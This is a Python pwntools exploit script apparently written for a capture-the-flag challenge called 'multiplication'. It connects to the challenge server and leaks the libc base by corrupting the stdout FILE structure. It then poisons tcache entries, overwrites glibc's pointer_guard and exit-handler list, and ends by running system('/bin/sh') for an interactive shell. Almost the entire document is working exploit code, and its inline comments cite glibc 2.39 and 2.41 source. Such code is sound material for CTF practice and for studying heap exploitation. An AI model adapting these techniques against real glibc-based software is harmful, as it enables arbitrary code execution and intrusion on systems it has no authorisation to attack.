from pwn import *

chal = ELF('./vuln')
libc = ELF('./libc.so.6')

context.binary = chal
context.terminal = ["tmux", "splitw", "-h"]

#conn = remote('localhost', 1337)
conn = remote('multiplication.chal.imaginaryctf.org', 1337)

def create(size, content):
    conn.sendlineafter(b'> ', b'1')
    conn.sendlineafter(b': ', str(size).encode())
    conn.sendlineafter(b': ', content)

def delete():
    conn.sendlineafter(b'> ', b'2')

def edit(item):
    conn.sendlineafter(b'> ', b'3')
    conn.sendlineafter(b': ', str(item).encode())

def exit_program():
    conn.sendlineafter(b'> ', b'4')

def main():
    """
    pause()
    pid = int(process(['pgrep', '-f', '-n', '/home/user/chal']).recvline().strip())
    gdbscript='''
    b *edit + 124
    b *create + 81
    c
    '''
    gdb.attach(pid, exe=chal.path, gdbscript=gdbscript)
    """

    # To allocate a chunk with `mmap``, `size`` must be greater than or equal to `DEFAULT_MMAP_THRESHOLD_MIN`.
    # See:
    # - https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2563-L2565
    # - https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L946
    size = 0x20000 + 0x1000
    assert size >= 0x20000
    create(size - 0x8, b'')

    # Increase `_IO_2_1_stdout_->file->`_IO_write_ptr` so that we can leak the libc base.
    # See:
    # - https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/ioputs.c#L40
    # - https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/fileops.c#L1244
    # - https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/fileops.c#L775-L777
    # - https://elixir.bootlin.com/glibc/glibc-2.39/source/libio/fileops.c#L422-L458

    edit(0x2295d8)
    conn.recv(5)
    libc.address = u64(conn.recv(8)) - 0x205710
    addr_initial = libc.sym.initial
    addr_system = libc.sym.system
    addr_binsh = next(libc.search(b'/bin/sh\0'))
    addr_func = addr_initial + 0x10
    addr_tls = libc.address - 0x28c0
    addr_pointer_guard = addr_tls + 0x30 
    info(f'libc.address = {libc.address:#x}')
    info(f'{addr_func = :#x}')
    info(f'{addr_system = :#x}')
    info(f'{addr_binsh = :#x}')
    info(f'{addr_tls = :#x}')
    info(f'{addr_pointer_guard = :#x}')

    # Increase `mp_->tcache_bins` so that we can "allocate" a chunk whose size is larger than 0x410 from tcache later.
    # See:
    # - https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L3316-L3318
    edit(0x2281d8)

    # For chunk sizes 0x440 and 0x460, the `tc_idx`` values are 0x42 and 0x44 respectively. 
    # Write the address into the corresponding `tcache->entries[tc_idx]`.
    # See:
    # - https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L3118-L3122
    create(0x30 - 0x8, p64(addr_func) + p64(0) + p64(addr_pointer_guard))

    # Satisfy `tcache->counts[tc_idx]` > 0.
    create(0x20 - 0x8, b'')
    delete()
    create(0x30 - 0x8, b'')
    delete()

    # Overwrite `pointer_guard`, `initial` and call `system("/bin/sh")`.
    # See:
    # - https://elixir.bootlin.com/glibc/glibc-2.41/source/stdlib/exit.c#L108-L121
    # - https://elixir.bootlin.com/glibc/glibc-2.41/source/stdlib/cxa_atexit.c#L73-L74
    # - https://elixir.bootlin.com/glibc/glibc-2.41/source/stdlib/exit.h#L34-L60
    # - https://elixir.bootlin.com/glibc/glibc-2.41/source/sysdeps/unix/sysv/linux/x86_64/pointer_guard.h#L43-L46
    # - https://elixir.bootlin.com/glibc/glibc-2.41/source/sysdeps/x86_64/nptl/tcb-offsets.sym#L13
    # - https://elixir.bootlin.com/glibc/glibc-2.41/source/sysdeps/x86_64/nptl/tls.h#L36-L70
    create(0x440 - 0x8, p64(4) + p64(0) + p64(addr_binsh))
    create(0x460 - 0x8, p64(addr_system))

    exit_program()
    conn.interactive()

if __name__ == '__main__':
    main()